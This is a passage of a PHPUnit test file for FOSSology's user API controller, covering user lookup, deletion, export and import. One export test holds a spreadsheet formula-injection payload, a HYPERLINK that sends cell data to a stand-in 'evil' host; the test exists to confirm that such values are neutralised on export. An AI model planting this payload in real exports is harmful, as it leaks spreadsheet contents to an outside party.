<?php
/*
 SPDX-FileCopyrightText: © 2020 Siemens AG
 Author: Gaurav Mishra <mishra.gaurav@siemens.com>

 SPDX-License-Identifier: GPL-2.0-only
*/
/**
 * @file
 * @brief Tests for UserController
 */

namespace Fossology\UI\Api\Test\Controllers;

require_once dirname(__DIR__, 4) . '/lib/php/Plugin/FO_Plugin.php';

use Fossology\Lib\Auth\Auth;
use Fossology\UI\Api\Exceptions\HttpBadRequestException;
use Fossology\UI\Api\Exceptions\HttpForbiddenException;
use Fossology\UI\Api\Exceptions\HttpNotFoundException;
use Mockery as M;
use Fossology\UI\Api\Controllers\UserController;
use Fossology\UI\Api\Helper\DbHelper;
use Fossology\UI\Api\Helper\RestHelper;
use Fossology\UI\Api\Models\User;
use Fossology\UI\Api\Models\Info;
use Fossology\UI\Api\Models\InfoType;
use Fossology\UI\Api\Models\ApiVersion;
use Fossology\UI\Api\Helper\ResponseHelper;
use Fossology\Lib\Dao\UserDao;
use Slim\Psr7\Request;

/**
 * @class UserControllerTest
 * @brief Test cases for UserController
 */
class UserControllerTest extends \PHPUnit\Framework\TestCase
{

  /**
   * @var integer $assertCountBefore
   * Assertions before running tests
   */
  private $assertCountBefore;

  /**
   * @var DbHelper $dbHelper
   * DbHelper mock
   */
  private $dbHelper;

  /**
   * @var RestHelper $restHelper
   * RestHelper mock
   */
  private $restHelper;

  /**
   * @brief Setup test objects
   * @see PHPUnit_Framework_TestCase::setUp()
   */
  protected function setUp() : void
  {
    global $container;
    $container = M::mock('ContainerBuilder');
    $this->dbHelper = M::mock(DbHelper::class);
    $this->restHelper = M::mock(RestHelper::class);
    $this->userDao = M::mock(UserDao::class);

    $this->restHelper->shouldReceive('getDbHelper')->andReturn($this->dbHelper);
    $this->restHelper->shouldReceive('getUserDao')
      ->andReturn($this->userDao);

    $container->shouldReceive('get')->withArgs(array(
      'helper.restHelper'))->andReturn($this->restHelper);
    $this->userController = new UserController($container);
    $this->assertCountBefore = \Hamcrest\MatcherAssert::getCount();
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
  }

  /**
   * @brief Remove test objects
   * @see PHPUnit_Framework_TestCase::tearDown()
   */
  protected function tearDown() : void
  {
    $this->addToAssertionCount(
      \Hamcrest\MatcherAssert::getCount() - $this->assertCountBefore);
    M::close();
    unset($_SESSION[Auth::USER_LEVEL]);
  }

  /**
   * Helper function to get JSON array from response
   *
   * @param Response $response
   * @return array Decoded response
   */
  private function getResponseJson($response)
  {
    $response->getBody()->seek(0);
    return json_decode($response->getBody()->getContents(), true);
  }

  /**
   * Generate array of users
   * @param array $userIds User ids to be generated
   * @return array[]
   */
  private function getUsers($userIds)
  {
    $userArray = array();
    foreach ($userIds as $userId) {
      if ($userId == 2) {
        $accessLevel = PLUGIN_DB_ADMIN;
      } elseif ($userId > 2 && $userId <= 4) {
        $accessLevel = PLUGIN_DB_WRITE;
      } elseif ($userId == 5) {
        $accessLevel = PLUGIN_DB_READ;
      } else {
        continue;
      }
      $user = new User($userId, "user$userId", "User $userId",
        "user$userId@example.com", $accessLevel, 2, 4, "");
      $userArray[] = $user;
    }
    return $userArray;
  }

  /**
   * @test
   * -# Test UserController::getUsers() for specific user id for version 1
   * -# Check if response contains only one user info
   */
  public function testGetSpecificUserV1()
  {
    $this->testGetSpecificUser(ApiVersion::V1);
  }
  /**
   * @test
   * -# Test UserController::getUsers() for specific user id for version 2
   * -# Check if response contains only one user info
   */
  public function testGetSpecificUserV2()
  {
    $this->testGetSpecificUser();
  }
  /**
   * @param $version to test
   * @return void
   */
  private function testGetSpecificUser($version = ApiVersion::V2)
  {
    $userId = 2;
    $userName = 'fossy';
    $userArray = ['user_pk' => $userId];
    $user = $this->getUsers([$userId]);
    if ($version == ApiVersion::V2) {
      $userArray = ['user_pk' => $userId];
      $this->restHelper->getUserDao()->shouldReceive('getUserByName')
        ->withArgs([$userId])->andReturn($userArray);
    }
    $request = M::mock(Request::class);
    $this->restHelper->getUserDao()->shouldReceive('getUserByName')
      ->withArgs([$userName])->andReturn($userArray);
    $request->shouldReceive('getAttribute')->andReturn($version);
    $this->dbHelper->shouldReceive('doesIdExist')
      ->withArgs(["users", "user_pk", $userId])->andReturn(true);
    $this->dbHelper->shouldReceive('getUsers')->withArgs([$userId])
      ->andReturn($user);
    $expectedResponse = (new ResponseHelper())->withJson($user[0]->getArray($version), 200);
    $actualResponse = $this->userController->getUsers($request, new ResponseHelper(),
      ['pathParam' => $userId]);
    $this->assertEquals($expectedResponse->getStatusCode(),
      $actualResponse->getStatusCode());
    $this->assertEquals($this->getResponseJson($expectedResponse),
      $this->getResponseJson($actualResponse));
  }

  /**
   * @test
   * -# Test UserController::getUsers() for invalid user id for version 1
   * -# Check if response status is 404
   */
  public function testGetSpecificUserNotFoundV1()
  {
    $this->testGetSpecificUserNotFound(ApiVersion::V1);
  }
  /**
   * @test
   * -# Test UserController::getUsers() for invalid user id for version 2
   * -# Check if response status is 404
   */
  public function testGetSpecificUserNotFoundV2()
  {
    $this->testGetSpecificUserNotFound();
  }
  /**
   * @param $version to test
   * @return void
   */
  private function testGetSpecificUserNotFound($version = ApiVersion::V2)
  {
    $userId = 6;
    $request = M::mock(Request::class);
    if ($version == ApiVersion::V2) {
      $userArray = ['user_pk' => $userId];
      $this->restHelper->getUserDao()->shouldReceive('getUserByName')
        ->withArgs([$userId])->andReturn($userArray);
    }
    $request->shouldReceive('getAttribute')->andReturn($version);
    $this->dbHelper->shouldReceive('doesIdExist')
      ->withArgs(["users", "user_pk", $userId])->andReturn(false);
    $this->expectException(HttpNotFoundException::class);

    $this->userController->getUsers($request, new ResponseHelper(),
      ['pathParam' => $userId]);
  }

  /**
   * @test
   * -# Test UserController::getUsers() for all users for version 1
   * -# Check if the response is list of user info
   */
  public function testGetAllUsersV1()
  {
    $this->testGetAllUsers(ApiVersion::V1);
  }
  /**
   * @test
   * -# Test UserController::getUsers() for all users for version 2
   * -# Check if the response is list of user info
   */
  public function testGetAllUsersV2()
  {
    $this->testGetAllUsers();
  }
  /**
   * @param $version to test
   * @return void
   */
  private function testGetAllUsers($version = ApiVersion::V2)
  {
    $userId = 2;
    $users = $this->getUsers([2, 3, 4]);
    if ($version == ApiVersion::V2) {
      $userArray = ['user_pk' => $userId];
      $this->restHelper->getUserDao()->shouldReceive('getUserByName')
        ->withArgs([$userId])->andReturn($userArray);
    }
    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn($version);
    $this->dbHelper->shouldReceive('getUsers')->withArgs([null])
      ->andReturn($users);

    $allUsers = array();
    foreach ($users as $user) {
      $allUsers[] = $user->getArray($version);
    }

    $expectedResponse = (new ResponseHelper())->withJson($allUsers, 200);
    $actualResponse = $this->userController->getUsers($request, new ResponseHelper(), []);
    $this->assertEquals($expectedResponse->getStatusCode(),
      $actualResponse->getStatusCode());
    $this->assertEquals($this->getResponseJson($expectedResponse),
      $this->getResponseJson($actualResponse));
  }

  /**
   * @test
   * -# Test UserController::deleteUser() for valid delete request for version 1
   * -# Check if response status is 202
   */
  public function testDeleteUserV1()
  {
    $this->testDeleteUser(ApiVersion::V1);
  }
  /**
   * @test
   * -# Test UserController::deleteUser() for valid delete request for version 2
   * -# Check if response status is 202
   */
  public function testDeleteUserV2()
  {
    $this->testDeleteUser();
  }
  /**
   * @param $version to test
   * @return void
   */
  private function testDeleteUser($version = ApiVersion::V2)
  {
    $userId = 4;
    $userArray = ['user_pk' => $userId];
    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn($version);
    $this->restHelper->getUserDao()->shouldReceive('getUserByName')
      ->withArgs([$userId])->andReturn($userArray);
    $this->dbHelper->shouldReceive('doesIdExist')
      ->withArgs(["users", "user_pk", $userId])->andReturn(true);
    $this->dbHelper->shouldReceive('deleteUser')->withArgs([$userId]);
    $info = new Info(202, "User will be deleted", InfoType::INFO);
    $expectedResponse = (new ResponseHelper())->withJson($info->getArray(),
      $info->getCode());
    $actualResponse = $this->userController->deleteUser($request, new ResponseHelper(),
      ['pathParam' => $userId]);
    $this->assertEquals($expectedResponse->getStatusCode(),
      $actualResponse->getStatusCode());
    $this->assertEquals($this->getResponseJson($expectedResponse),
      $this->getResponseJson($actualResponse));
  }

  /**
   * @test
   * -# Test UserController::deleteUser() for invalid user id for version 1
   * -# Check if response status is 404
   */
  public function testDeleteUserDoesNotExistsV1()
  {
    $this->testDeleteUserDoesNotExists(ApiVersion::V1);
  }
  /**
   * @test
   * -# Test UserController::deleteUser() for invalid user id for version 2
   * -# Check if response status is 404
   */
  public function testDeleteUserDoesNotExistsV2()
  {
    $this->testDeleteUserDoesNotExists();
  }
  /**
   * @param $version
   * @return void
   */
  private function testDeleteUserDoesNotExists($version = ApiVersion::V2)
  {
    $userId = 8;
    $userArray = ['user_pk' => $userId];
    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn($version);
    $this->restHelper->getUserDao()->shouldReceive('getUserByName')
      ->withArgs([$userId])->andReturn($userArray);
    $this->dbHelper->shouldReceive('doesIdExist')
      ->withArgs(["users", "user_pk", $userId])->andReturn(false);
    $this->expectException(HttpNotFoundException::class);

    $this->userController->deleteUser($request, new ResponseHelper(),
      ['pathParam' => $userId]);
  }

  /**
   * @test
   * -# Test UserController::getCurrentUser() for version 1
   * -# Check if response contains current user's info
   */
  public function testGetCurrentUserV1()
  {
    $this->testGetCurrentUser(ApiVersion::V1);
  }
  /**
   * @test
   * -# Test UserController::getCurrentUser() for version 2
   * -# Check if response contains current user's info
   */
  public function testGetCurrentUserV2()
  {
    $this->testGetCurrentUser();
  }
  /**
   * @param $version to test
   * @return void
   */
  private function testGetCurrentUser($version = ApiVersion::V2)
  {
    $userId = 2;
    $user = $this->getUsers([$userId]);
    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn($version);
    $this->restHelper->shouldReceive('getUserId')->andReturn($userId);
    $this->dbHelper->shouldReceive('getUsers')->withArgs([$userId])
      ->andReturn($user);
    $this->userDao->shouldReceive('getUserAndDefaultGroupByUserName')->withArgs([$user[0]->getArray()["name"]])
      ->andReturn(["group_name" => "fossy"]);

    $expectedUser = $user[0]->getArray($version);
    if ($version == ApiVersion::V1) {
      $expectedUser["default_group"] = "fossy";
    }
    $expectedResponse = (new ResponseHelper())->withJson($expectedUser, 200);

    $actualResponse = $this->userController->getCurrentUser($request,
      new ResponseHelper(), []);
    $this->assertEquals($expectedResponse->getStatusCode(),
      $actualResponse->getStatusCode());
    $this->assertEquals($this->getResponseJson($expectedResponse),
      $this->getResponseJson($actualResponse));
  }

  /**
   * @test
   * -# Test UserController::addUser() with empty request body
   * -# Check if HttpBadRequestException is thrown
   */
  public function testAddUserEmptyBody()
  {
    $request = M::mock(Request::class);
    $request->shouldReceive('getHeaderLine')
      ->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V1);
    $request->shouldReceive('getParsedBody')->andReturn(null);

    $this->expectException(HttpBadRequestException::class);
    $this->expectExceptionMessage("Request body is empty or malformed.");

    $this->userController->addUser($request, new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::addUser() with missing username
   * -# Check if HttpBadRequestException is thrown
   */
  public function testAddUserMissingName()
  {
    $request = M::mock(Request::class);
    $request->shouldReceive('getHeaderLine')
      ->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V1);
    $request->shouldReceive('getParsedBody')->andReturn(['email' => 'test@test.com']);

    $this->expectException(HttpBadRequestException::class);
    $this->expectExceptionMessage("Username must be specified.");

    $this->userController->addUser($request, new ResponseHelper(), []);
  }

  /**
   * Invoke a private/protected method via reflection.
   *
   * @param object $object
   * @param string $method
   * @param array $args
   * @return mixed
   */
  private function invokePrivate($object, $method, array $args)
  {
    $reflection = new \ReflectionClass(get_class($object));
    $m = $reflection->getMethod($method);
    $m->setAccessible(true);
    return $m->invokeArgs($object, $args);
  }

  /**
   * Register $_FILES['fileInput'] pointing at a real file on disk, mimicking
   * a multipart file upload without needing a real HTTP request.
   *
   * @param string $path
   * @param string $originalName
   */
  private function setUploadedFile($path, $originalName)
  {
    $_FILES['fileInput'] = [
      'name' => $originalName,
      'type' => 'application/octet-stream',
      'tmp_name' => $path,
      'error' => UPLOAD_ERR_OK,
      'size' => filesize($path),
    ];
  }

  /**
   * @param string $content
   * @param string $suffix
   * @return string Path to a temp file, auto-deleted at process exit
   */
  private function writeTempFile($content, $suffix)
  {
    $path = tempnam(sys_get_temp_dir(), 'fo_user_import_') . $suffix;
    file_put_contents($path, $content);
    register_shutdown_function(function () use ($path) {
      @unlink($path);
    });
    return $path;
  }

  /**
   * @param array $createUserReturn|null Fixed [success, message] return, or
   *   null to configure the mock with andReturnUsing() separately.
   * @return M\MockInterface&UserController
   */
  private function newControllerWithMockedCreateUser()
  {
    global $container;
    $controller = M::mock(UserController::class . '[createUserFromImportRow]', [$container])
      ->shouldAllowMockingProtectedMethods();
    return $controller;
  }

  /**
   * Build a mocked request carrying the given "format" query parameter
   * (plus any extra query params), for handleExportUsers() tests.
   *
   * @param string|null $format Value for the "format" query parameter, or
   *   null to omit it (exercises the default-to-csv behavior).
   * @param array $extraParams Additional query params, e.g. delimiter/enclosure.
   * @return M\MockInterface&Request
   */
  private function mockExportRequest($format, $extraParams = [])
  {
    $request = M::mock(Request::class);
    $params = array_merge($format === null ? [] : ['format' => $format], $extraParams);
    $request->shouldReceive('getQueryParams')->andReturn($params);
    return $request;
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() for non-admin user
   * -# Check if HttpForbiddenException is thrown
   */
  public function testExportUsersToCSVNotAdmin()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_WRITE;
    $this->expectException(HttpForbiddenException::class);
    $this->userController->handleExportUsers(null, new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() exports all users as CSV
   * -# Check headers and that the "mimetype" DB flag round-trips to the
   *    "agent_mime" CSV column
   */
  public function testExportUsersToCSV()
  {
    $users = [
      new User(2, "user2", "User 2", "user2@example.com", PLUGIN_DB_ADMIN, 2,
        true, "nomos,monk,mimetype"),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest('csv'), new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
    $this->assertStringContainsString('csv', $response->getHeaderLine('Content-type'));
    $this->assertStringContainsString('attachment', $response->getHeaderLine('Content-Disposition'));

    $body = str_replace("\r\n", "\n", (string) $response->getBody());
    $lines = array_values(array_filter(explode("\n", $body), function ($line) {
      return $line !== '';
    }));
    $header = str_getcsv($lines[0]);
    $row = array_combine($header, str_getcsv($lines[1]));

    $this->assertEquals('user2', $row['name']);
    $this->assertEquals('admin', $row['accessLevel']);
    $this->assertEquals('1', $row['agent_mime']);
    $this->assertEquals('1', $row['agent_monk']);
    $this->assertEquals('0', $row['agent_ecc']);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with a user description that
   *    looks like a spreadsheet formula
   * -# Check that it is prefixed with a single quote so Excel/LibreOffice/
   *    Sheets treat it as text instead of executing it as a formula
   */
  public function testExportUsersToCSVEscapesFormulaInjection()
  {
    $users = [
      new User(4, "user4", "=HYPERLINK(\"http://evil/?x=\"&A1,\"x\")",
        "user4@example.com", PLUGIN_DB_WRITE, 2, false, ""),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest('csv'), new ResponseHelper(), []);
    $body = str_replace("\r\n", "\n", (string) $response->getBody());
    $lines = array_values(array_filter(explode("\n", $body), function ($line) {
      return $line !== '';
    }));
    $header = str_getcsv($lines[0]);
    $row = array_combine($header, str_getcsv($lines[1]));

    $this->assertStringStartsWith("'=", $row['description']);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with no "format" query
   *    parameter given
   * -# Check that it defaults to CSV
   */
  public function testExportUsersDefaultsToCsv()
  {
    $users = [
      new User(2, "user2", "User 2", "user2@example.com", PLUGIN_DB_ADMIN, 2, true, ""),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest(null), new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
    $this->assertStringContainsString('csv', $response->getHeaderLine('Content-type'));
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with an unsupported
   *    "format" query parameter value
   * -# Check if HttpBadRequestException is thrown
   */
  public function testExportUsersInvalidFormat()
  {
    $this->expectException(HttpBadRequestException::class);
    $this->userController->handleExportUsers(
      $this->mockExportRequest('xml'), new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with an array-valued
   *    "format" query parameter (e.g. from ?format[]=csv)
   * -# Check that it is rejected with the normal HttpBadRequestException
   *    instead of a TypeError from strtolower(array)
   */
  public function testExportUsersArrayFormatDoesNotCrash()
  {
    $request = M::mock(Request::class);
    $request->shouldReceive('getQueryParams')->andReturn(['format' => ['csv']]);

    $this->expectException(HttpBadRequestException::class);
    $this->userController->handleExportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with a custom "delimiter"
   *    query parameter (semicolon, one of CSV_DELIMITERS)
   * -# Check that the exported CSV actually uses it
   */
  public function testExportUsersCsvWithCustomDelimiter()
  {
    $users = [
      new User(2, "user2", "User 2", "user2@example.com", PLUGIN_DB_ADMIN, 2, true, ""),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest('csv', ['delimiter' => ';']), new ResponseHelper(), []);
    $body = str_replace("\r\n", "\n", (string) $response->getBody());
    $lines = array_values(array_filter(explode("\n", $body), function ($line) {
      return $line !== '';
    }));

    $this->assertStringContainsString(';', $lines[0]);
    $header = str_getcsv($lines[0], ';');
    $row = array_combine($header, str_getcsv($lines[1], ';'));
    $this->assertEquals('user2', $row['name']);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with a tab "delimiter"
   *    query parameter (an actual tab byte, matching CSV_DELIMITERS)
   * -# Check that the exported CSV actually uses it
   */
  public function testExportUsersCsvWithTabDelimiter()
  {
    $users = [
      new User(2, "user2", "User 2", "user2@example.com", PLUGIN_DB_ADMIN, 2, true, ""),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest('csv', ['delimiter' => "\t"]), new ResponseHelper(), []);
    $body = str_replace("\r\n", "\n", (string) $response->getBody());
    $lines = array_values(array_filter(explode("\n", $body), function ($line) {
      return $line !== '';
    }));

    $header = str_getcsv($lines[0], "\t");
    $row = array_combine($header, str_getcsv($lines[1], "\t"));
    $this->assertEquals('user2', $row['name']);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with a "delimiter" query
   *    parameter outside CSV_DELIMITERS
   * -# Check if HttpBadRequestException is thrown
   */
  public function testExportUsersRejectsInvalidDelimiter()
  {
    $this->expectException(HttpBadRequestException::class);
    $this->userController->handleExportUsers(
      $this->mockExportRequest('csv', ['delimiter' => '|']), new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with an "enclosure" query
   *    parameter outside CSV_ENCLOSURES
   * -# Check if HttpBadRequestException is thrown
   */
  public function testExportUsersRejectsInvalidEnclosure()
  {
    $this->expectException(HttpBadRequestException::class);
    $this->userController->handleExportUsers(
      $this->mockExportRequest('csv', ['enclosure' => '*']), new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() with format=json and an
   *    invalid "delimiter" query parameter
   * -# Check that delimiter is ignored (no exception) since it only
   *    applies to the CSV branch
   */
  public function testExportUsersJsonIgnoresInvalidDelimiter()
  {
    $users = [
      new User(2, "user2", "User 2", "user2@example.com", PLUGIN_DB_ADMIN, 2, true, ""),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest('json', ['delimiter' => '|']), new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() for non-admin user
   * -# Check if HttpForbiddenException is thrown
   */
  public function testExportUsersToJSONNotAdmin()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_WRITE;
    $this->expectException(HttpForbiddenException::class);
    $this->userController->handleExportUsers(null, new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::handleExportUsers() exports all users as JSON
   * -# Check the nested agents object and the "mimetype" -> "mime"
   *    translation
   */
  public function testExportUsersToJSON()
  {
    $users = [
      new User(3, "user3", "User 3", "user3@example.com", PLUGIN_DB_WRITE, 2,
        false, "nomos,mimetype,ecc"),
    ];
    $this->dbHelper->shouldReceive('getUsers')->andReturn($users);

    $response = $this->userController->handleExportUsers(
      $this->mockExportRequest('json'), new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
    $this->assertStringContainsString('json', $response->getHeaderLine('Content-type'));

    $decoded = json_decode((string) $response->getBody(), true);
    $this->assertCount(1, $decoded);
    $this->assertEquals('user3', $decoded[0]['name']);
    $this->assertTrue($decoded[0]['agents']['mime']);
    $this->assertTrue($decoded[0]['agents']['ecc']);
    $this->assertFalse($decoded[0]['agents']['monk']);
  }

  /**
   * @test
   * -# Test UserController::handleImportUsers() for non-admin user
   * -# Check if HttpForbiddenException is thrown
   */
  public function testHandleImportUsersNotAdmin()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_WRITE;
    $this->expectException(HttpForbiddenException::class);
    $this->userController->handleImportUsers(null, new ResponseHelper(), []);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() without a file in the request
   * -# Check if HttpBadRequestException is thrown
   */
  public function testHandleImportUsersNoFileSelected()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $_FILES = [];
    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);

    $this->expectException(HttpBadRequestException::class);
    $this->expectExceptionMessage("No file selected");

    $this->userController->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with an unsupported file
   *    extension
   * -# Check if HttpBadRequestException is thrown
   */
  public function testHandleImportUsersInvalidExtension()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $path = $this->writeTempFile("not a csv or json", '.txt');
    $this->setUploadedFile($path, 'users.txt');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);

    $this->expectException(HttpBadRequestException::class);

    $this->userController->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a CSV file where one
   *    row succeeds and one row fails
   * -# Check that the response is a 200 summarizing both outcomes, and that
   *    the row is translated into the createUserFromImportRow() DTO shape
   *    correctly
   */
  public function testHandleImportUsersCsvPartialSuccess()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,description,email,accessLevel,rootFolderId,emailNotification,defaultBucketpool," .
      "agent_bucket,agent_copyrightEmailAuthor,agent_ecc,agent_keyword,agent_mime," .
      "agent_monk,agent_nomos,agent_ojo,agent_reso\n" .
      "alice,Alice desc,alice@example.com,read_write,2,1,2,0,0,0,0,1,1,0,0,0\n" .
      "bob" . str_repeat(',', 15) . "\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn([]);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->andReturnUsing(
      function ($userDetails) {
        if ($userDetails['name'] === 'alice') {
          $this->assertEquals('read_write', $userDetails['accessLevel']);
          $this->assertEquals('2', $userDetails['rootFolderId']);
          $this->assertTrue($userDetails['emailNotification']);
          $this->assertTrue($userDetails['agents']['mime']);
          $this->assertTrue($userDetails['agents']['monk']);
          $this->assertFalse($userDetails['agents']['bucket']);
          return [true, "User 'alice' created successfully."];
        }
        return [false, 'Username must be specified.'];
      }
    );

    $response = $controller->handleImportUsers($request, new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
    $body = json_decode((string) $response->getBody(), true);
    $this->assertStringContainsString('1 of 2 user(s) imported successfully', $body['message']);
    $this->assertStringContainsString('bob', $body['message']);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() when the request reaches
   *    this shared '/users' route group via the /repo/api/v1 URL prefix
   * -# Check that the parsed row still carries the V2-named agent keys
   *    (copyrightEmailAuthor, not copyright_email_author), instead of
   *    silently dropping them because the request came in on the V1 prefix
   */
  public function testHandleImportUsersUsesV2DtoRegardlessOfRequestVersion()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,agent_copyrightEmailAuthor,agent_nomos\n" .
      "alice,1,1\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V1);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn([]);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->once()->andReturnUsing(
      function ($userDetails) {
        $this->assertTrue($userDetails['agents']['copyrightEmailAuthor']);
        $this->assertTrue($userDetails['agents']['nomos']);
        return [true, 'ok'];
      }
    );

    $response = $controller->handleImportUsers($request, new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a delimiter outside
   *    CSV_DELIMITERS (also invalid for fgetcsv(), which throws a
   *    ValueError on PHP >= 8.1 for anything but a single byte)
   * -# Check if HttpBadRequestException is thrown instead of silently
   *    truncating to the first character
   */
  public function testHandleImportUsersRejectsInvalidDelimiter()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name;;email\nalice;;alice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn(['delimiter' => ';;', 'enclosure' => '']);

    $this->expectException(HttpBadRequestException::class);

    $this->userController->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with an enclosure outside
   *    CSV_ENCLOSURES
   * -# Check if HttpBadRequestException is thrown
   */
  public function testHandleImportUsersRejectsInvalidEnclosure()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,email\nalice,alice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn(['enclosure' => '|']);

    $this->expectException(HttpBadRequestException::class);

    $this->userController->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a tab delimiter (an
   *    actual tab byte, matching CSV_DELIMITERS -- not the two characters
   *    "\" and "t")
   * -# Check that the row is parsed correctly
   */
  public function testHandleImportUsersAcceptsTabDelimiter()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name\temail\nalice\talice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn(['delimiter' => "\t"]);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->once()->andReturnUsing(
      function ($userDetails) {
        $this->assertEquals('alice', $userDetails['name']);
        $this->assertEquals('alice@example.com', $userDetails['email']);
        return [true, 'ok'];
      }
    );

    $response = $controller->handleImportUsers($request, new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a non-string delimiter
   *    (e.g. a malformed multipart array value)
   * -# Check that the default delimiter is used instead of erroring
   */
  public function testHandleImportUsersIgnoresNonStringDelimiter()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,email\nalice,alice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
